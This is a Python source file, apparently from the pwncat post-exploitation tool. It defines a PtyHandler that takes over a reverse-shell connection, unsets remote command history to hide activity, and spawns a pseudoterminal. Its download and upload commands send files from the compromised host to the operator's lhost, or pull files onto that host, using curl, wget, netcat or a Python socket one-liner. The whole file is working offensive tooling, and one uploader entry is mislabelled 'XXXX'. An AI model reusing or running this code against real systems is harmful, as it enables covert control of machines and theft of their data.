#!/usr/bin/env python3
from prompt_toolkit import prompt, PromptSession
from prompt_toolkit.shortcuts import ProgressBar
import subprocess
import logging
import argparse
import base64
import time
import socket
import enum
import shlex
import sys
import os

from pwncat import util


class State(enum.Enum):
    """ The current PtyHandler state """

    NORMAL = enum.auto()
    RAW = enum.auto()
    COMMAND = enum.auto()


class PtyHandler:
    """ Handles creating the pty on the remote end and locally processing input
    on the local end """

    OPEN_METHODS = {
        "script": "exec {} -qc /bin/sh /dev/null",
        "python": "exec {} -c \"import pty; pty.spawn('/bin/sh')\"",
    }

    INTERESTING_BINARIES = [
        ("python", "python", 9999),
        ("python2", "python", 9998),
        ("python3", "python", 10000),
        ("perl", "perl", 0),
        ("bash", "sh", 10000),
        ("dash", "sh", 9999),
        ("zsh", "sh", 9999),
        ("sh", "sh", 0),
        ("curl", "curl", 0),
        ("wget", "wget", 0),
        ("nc", "nc", 0),
        ("netcat", "nc", 0),
        ("ncat", "nc", 0),
        ("script", "script", 0),
    ]

    def __init__(self, client: socket.SocketType):
        """ Initialize a new Pty Handler. This will handle creating the PTY and
        setting the local terminal to raw. It also maintains the state to open a
        local terminal if requested and exit raw mode. """

        self.client = client
        self.state = "normal"
        self.saved_term_state = None
        self.input = b""
        self.lhost = None
        self.known_binaries = {}
        self.vars = {"lhost": None}
        self.prompt = PromptSession("localhost$ ")

        # We should always get a response within 3 seconds...
        self.client.settimeout(3)

        # Ensure history is disabled
        util.info("disabling remote command history", overlay=True)
        client.sendall(b"unset HISTFILE\n")
        self.recvuntil(b"\n")

        util.info("setting terminal prompt", overlay=True)
        client.sendall(b'export PS1="(remote) \\u@\\h\\$ "\n\n')
        self.recvuntil(b"\n")
        self.recvuntil(b"\n")

        # Locate interesting binaries
        for name, friendly, priority in PtyHandler.INTERESTING_BINARIES:
            util.info(f"resolving remote binary: {name}", overlay=True)

            # We already found a preferred option
            if (
                friendly in self.known_binaries
                and self.known_binaries[friendly][1] > priority
            ):
                continue

            # Look for the given binary
            response = self.run(f"which {shlex.quote(name)}", has_pty=False)
            if response == b"":
                continue

            self.known_binaries[friendly] = (response.decode("utf-8"), priority)

        for m, cmd in PtyHandler.OPEN_METHODS.items():
            if m in self.known_binaries:
                method_cmd = cmd.format(self.known_binaries[m][0])
                method = m
                break
        else:
            util.error("no available methods to spawn a pty!")
            raise RuntimeError("no available methods to spawn a pty!")

        # Open the PTY
        util.info(f"opening pseudoterminal via {method}", overlay=True)
        client.sendall(method_cmd.encode("utf-8") + b"\n")

        # Make sure HISTFILE is unset in this PTY
        self.run("unset HISTFILE")

        # Synchronize the terminals
        util.info("synchronizing terminal state", overlay=True)
        self.do_sync([])

        # Force the local TTY to enter raw mode
        self.enter_raw()

    def process_input(self, data: bytes):
        r""" Process a new byte of input from stdin. This is to catch "\r~C" and open
        a local prompt """

        # Send the new data to the client
        self.client.send(data)

        # Only process data following a new line
        if data == b"\r":
            self.input = data
        elif len(data) == 0:
            return
        else:
            self.input += data

        if self.input == b"\r~C":
            # Erase the current line on the remote host ("~C")
            # This is 2 backspace characters
            self.client.send(b"\x08" * 2 + b"\r")
            # Start processing local commands
            self.enter_command()
        elif len(self.input) >= 3:
            # Our only escapes are 3 characters (include the newline)
            self.input = b""

    def recv(self) -> bytes:
        """ Recieve data from the client """
        return self.client.recv(4096)

    def enter_raw(self, save: bool = True):
        """ Enter raw mode on the local terminal """
        old_term_state = util.enter_raw_mode()

        self.state = State.RAW

        # Save the state if requested
        if save:
            self.saved_term_state = old_term_state

    def enter_command(self):
        """ Enter commmand mode. This sets normal mode and uses prompt toolkit
        process commands from the user for the local machine """

        # Go back to normal mode
        self.restore()
        self.state = State.COMMAND

        # Hopefully this fixes weird cursor position issues
        sys.stdout.write("\n")

        # Process commands
        while self.state is State.COMMAND:
            try:
                try:
                    line = self.prompt.prompt()
                except (EOFError, OSError):
                    # The user pressed ctrl-d, go back
                    self.enter_raw()
                    continue

                if len(line) > 0 and line[0] == "!":
                    # Allow running shell commands
                    subprocess.run(line[1:], shell=True)
                    continue

                argv = shlex.split(line)

                # Empty command
                if len(argv) == 0:
                    continue

                try:
                    method = getattr(self, f"do_{argv[0]}")
                except AttributeError:
                    util.warn(f"{argv[0]}: command does not exist")
                    continue

                # Call the method
                method(argv[1:])
            except KeyboardInterrupt:
                continue

    def do_back(self, _):
        """ Exit command mode """
        self.enter_raw(save=False)

    def do_download(self, argv):

        uploaders = {
            "curl": (
                "http",
                "{cmd} -X POST --data @{remote_file} http://{lhost}:{lport}/{lfile}",
            ),
            "XXXX": (
                "http",
                "{cmd} --post-file {remote_file} http://{lhost}:{lport}/{lfile}",
            ),
            "nc": ("raw", "nc {lhost} {lport} < {remote_file}"),
            "python": (
                "raw",
                """{cmd} -c 'from socket import AF_INET, socket, SOCK_STREAM; import shutil; s=socket(AF_INET, SOCK_STREAM); s.connect(("{lhost}", {lport})); fp = open("{remote_file}", "rb"); shutil.copyfileobj(fp, s.makefile("wb", buffering=0))'""",
            ),
        }
        servers = {"http": util.receive_http_file, "raw": util.receive_raw_file}

        parser = argparse.ArgumentParser(prog="download")
        parser.add_argument(
            "--method",
            "-m",
            choices=uploaders.keys(),
            default=None,
            help="set the download method (default: auto)",
        )
        parser.add_argument(
            "--output",
            "-o",
            default="./{basename}",
            help="path to the output file (default: basename of input)",
        )
        parser.add_argument("path", help="path to the file to download")

        try:
            args = parser.parse_args(argv)
        except SystemExit:
            # The arguments were parsed incorrectly, return.
            return

        if self.vars.get("lhost", None) is None:
            util.error("[!] you must provide an lhost address for reverse connections!")
            return

        if args.method is not None and args.method not in self.known_binaries:
            util.error(f"{args.method}: method unavailable")
        elif args.method is not None:
            method = uploaders[args.method]
        else:
            method = None
            for m, info in uploaders.items():
                if m in self.known_binaries:
                    util.info(f"downloading via {m}")
                    method = info
                    args.method = m
                    break
            else:
                util.warn(
                    "no available download methods. falling back to dd/base64 method"
                )

        path = args.path
        basename = os.path.basename(args.path)
        name = basename
        outfile = args.output.format(basename=basename)

        # Get the remote file size
        size = self.run(f'stat -c "%s" {shlex.quote(path)} 2>/dev/null || echo "none"')
        if b"none" in size:
            util.error(f"{path}: no such file or directory")
            return
        size = int(size)

        with ProgressBar("downloading") as pb:

            counter = pb(range(os.path.getsize(path)))
            last_update = time.time()

            def on_progress(copied, blocksz):
                """ Update the progress bar """
                counter.items_completed += blocksz
                if counter.items_completed >= counter.total:
                    counter.done = True
                    counter.stopped = True
                if (time.time() - last_update) > 0.1:
                    pb.invalidate()

            if method is not None:
                server = servers[method[0]](outfile, name, progress=on_progress)

                command = method[1].format(
                    cmd=self.known_binaries[args.method][0],
                    remote_file=shlex.quote(path),
                    lhost=self.vars["lhost"],
                    lfile=name,
                    lport=server.server_address[1],
                )
                result = self.run(command, wait=False)
            else:
                server = None
                path = shlex.quote(path)
                with open(outfile, "wb") as fp:
                    copied = 0
                    blocksz = 1024 * 10
                    for chunk_nr in range(0, size // blocksz):
                        # Send the command
                        encoded = self.run(
                            f"dd if={path} bs={blocksz} count=1 skip={chunk_nr} 2>/dev/null | base64 -w0",
                        )
                        chunk = base64.b64decode(encoded)
                        fp.write(chunk)
                        copied += len(chunk)
                        on_progress(copied, len(chunk))

            try:
                while not counter.done:
                    time.sleep(0.1)
            except KeyboardInterrupt:
                pass
            finally:
                if server is not None:
                    server.shutdown()

            # https://github.com/prompt-toolkit/python-prompt-toolkit/issues/964
            time.sleep(0.1)

    def do_upload(self, argv):
        """ Upload a file to the remote host """

        downloaders = {
            "curl": ("http", "curl --output {outfile} http://{lhost}:{lport}/{lfile}"),
            "wget": ("http", "wget -O {outfile} http://{lhost}:{lport}/{lfile}"),
            "nc": ("raw", "nc {lhost} {lport} > {outfile}"),
        }
        servers = {"http": util.serve_http_file, "raw": util.serve_raw_file}

        parser = argparse.ArgumentParser(prog="upload")
        parser.add_argument(
            "--method",
            "-m",
            choices=downloaders.keys(),
            default=None,
            help="set the download method (default: auto)",
        )
        parser.add_argument(
            "--output",
            "-o",
            default="./{basename}",
            help="path to the output file (default: basename of input)",
        )
        parser.add_argument("path", help="path to the file to upload")

        try:
            args = parser.parse_args(argv)
        except SystemExit:
            # The arguments were parsed incorrectly, return.
            return

        if self.vars.get("lhost", None) is None:
            util.error("[!] you must provide an lhost address for reverse connections!")
            return

        if not os.path.isfile(args.path):
            util.error(f"[!] {args.path}: no such file or directory")
            return

        if args.method is not None and args.method not in self.known_binaries:
            util.error(f"{args.method}: method unavailable")
        elif args.method is not None:
            method = downloaders[args.method]
        else:
            method = None
            for m, info in downloaders.items():
                if m in self.known_binaries:
                    util.info("uploading via {m}")
                    method = info
                    break
            else:
                util.warn(
                    "no available upload methods. falling back to echo/base64 method"
                )

        path = args.path
        basename = os.path.basename(args.path)
        name = basename
        outfile = args.output.format(basename=basename)

        with ProgressBar("uploading") as pb:

            counter = pb(range(os.path.getsize(path)))
            last_update = time.time()

            def on_progress(copied, blocksz):
                """ Update the progress bar """
                counter.items_completed += blocksz
                if counter.items_completed >= counter.total:
                    counter.done = True
                    counter.stopped = True
                if (time.time() - last_update) > 0.1:
                    pb.invalidate()

            if method is not None:
                server = servers[method[0]](path, name, progress=on_progress)

                command = method[1].format(
                    outfile=shlex.quote(outfile),
                    lhost=self.vars["lhost"],
                    lfile=name,
                    lport=server.server_address[1],
                )

                result = self.run(command, wait=False)
            else:
                server = None
                with open(path, "rb") as fp:
                    self.run(f"echo -n > {outfile}")
                    copied = 0
                    for chunk in iter(lambda: fp.read(8192), b""):
                        encoded = base64.b64encode(chunk).decode("utf-8")
                        self.run(f"echo -n {encoded} | base64 -d >> {outfile}")
                        copied += len(chunk)
                        on_progress(copied, len(chunk))

            try:
                while not counter.done:
                    time.sleep(0.1)
            except KeyboardInterrupt:
                pass
            finally:
                if server is not None:
                    server.shutdown()

            # https://github.com/prompt-toolkit/python-prompt-toolkit/issues/964
            time.sleep(0.1)

    def do_sync(self, argv):
        """ Synchronize the remote PTY with the local terminal settings """

        TERM = os.environ.get("TERM", "xterm")
        columns, rows = os.get_terminal_size(0)

        self.run(f"stty rows {rows}")
        self.run(f"stty columns {columns}")
        self.run(f'export TERM="{TERM}"')

    def do_set(self, argv):
        """ Set or view the currently assigned variables """

        if len(argv) == 0:
            for k, v in self.vars.items():
                print(f" {k} = {shlex.quote(v)}")
            return

        parser = argparse.ArgumentParser(prog="set")
        parser.add_argument("variable", help="the variable name")
        parser.add_argument("value", help="the new variable type")
        args = parser.parse_args(argv)

        self.vars[args.variable] = args.value

    def do_help(self, argv):
        """ View help for local commands """

        if len(argv) == 0:
            commands = [x for x in dir(self) if x.startswith("do_")]
        else:
            commands = [x for x in dir(self) if x.startswith("do_") and x[3:] in argv]

        for c in commands:
            help_msg = getattr(self, c).__doc__
            print(f"{c[3:]:15s}{help_msg}")

    def run(self, cmd, has_pty=True, wait=True) -> bytes:
        """ Run a command in the context of the remote host and return the
        output. This is run synchrounously.

            :param cmd: The command to run. Either a string or an argv list.
            :param has_pty: Whether a pty was spawned
        """

        if isinstance(cmd, list):
            cmd = shlex.join(cmd)

        EOL = b"\r" if has_pty else b"\n"

        # Read until there's no more data in the queue
        # This works by waiting for our known prompt
        self.recvuntil(b"(remote) ")
        try:
            # Read to the end of the prompt
            self.recvuntil(b"$ ", socket.MSG_DONTWAIT)
        except BlockingIOError:
            # The prompt may be "#"
            try:
                self.recvuntil(b"# ", socket.MSG_DONTWAIT)
            except BlockingIOError:
                pass

        # Send the command to the remote host
        self.client.send(cmd.encode("utf-8") + EOL)

        # Initialize response buffer
        response = b""
        peek_len = 4096

        # Look for the next prompt in the output and leave it in the buffer
        if wait:
            while True:
                data = self.client.recv(peek_len, socket.MSG_PEEK)
                if b"(remote) " in data:
                    response = data.split(b"(remote) ")[0]
                    self.client.recv(len(response))
                    break
                if len(data) == peek_len:
                    peek_len += 4096

            # The echoed input command is currently in the output
            if has_pty:
                response = b"".join(response.split(b"\r\n")[1:])
            else:
                response = b"".join(response.split(b"\n")[1:])

            # Bash sends these escape sequences for some reason, and it fucks up
            # the output
            while b"\x1b_" in response:
                response = response.split(b"\x1b_")
                before = response[0]
                after = b"\x1b_".join(response[1:])
                response = before + b"\x1b\\".join(after.split(b"\x1b\\")[1])

        return response

    def recvuntil(self, needle: bytes, flags=0):
        """ Recieve data from the client until the specified string appears """

        result = b""
        while not result.endswith(needle):
            result += self.client.recv(1, flags)

        return result

    def restore(self):
        """ Restore the terminal state """
        util.restore_terminal(self.saved_term_state)
        self.state = State.NORMAL
